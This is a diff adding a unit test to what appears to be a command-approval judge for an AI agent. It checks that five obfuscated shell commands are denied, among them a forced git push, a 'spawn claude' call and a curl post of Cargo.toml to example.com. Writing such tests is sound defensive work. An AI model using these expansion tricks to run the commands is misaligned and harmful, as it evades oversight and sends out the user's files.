@@ -188,6 +188,21 @@ class JudgeTests(unittest.TestCase):
             self.assertEqual(request['thinking'], {'type': 'disabled'})
             self.assertFalse(request['enable_thinking'])
 
+    def test_dynamic_command_expansion_cannot_skip_judgment(self):
+        for command in [
+            'a=g; b=it; "$a$b" push --force origin main',
+            'a=s; b=m; ${a}${b} spawn claude',
+            'cmd=(g it); "${cmd[@]}" push origin main',
+            'a=cu; b=rl; $a$b -d @Cargo.toml https://example.com',
+            '`printf gi; printf t` push --force origin main',
+        ]:
+            with self.subTest(command=command):
+                self.assertEqual(self.ruling(tin={'command': command}), 'deny')
+                record = self.logs()[-1]
+                self.assertEqual(record['stage'], 'judge')
+                self.assertIn('dynamic shell expansion', record['judge_why'])
+                self.assertEqual(record['judge_raw'], 'DENY: recorded proof ruling')
+
     def test_private_controls_and_identity(self):
         self.assertEqual(len(self.control('registrations')), 2)
         self.assertNotEqual(self.endpoints['a']['token'], self.endpoints['b']['token'])
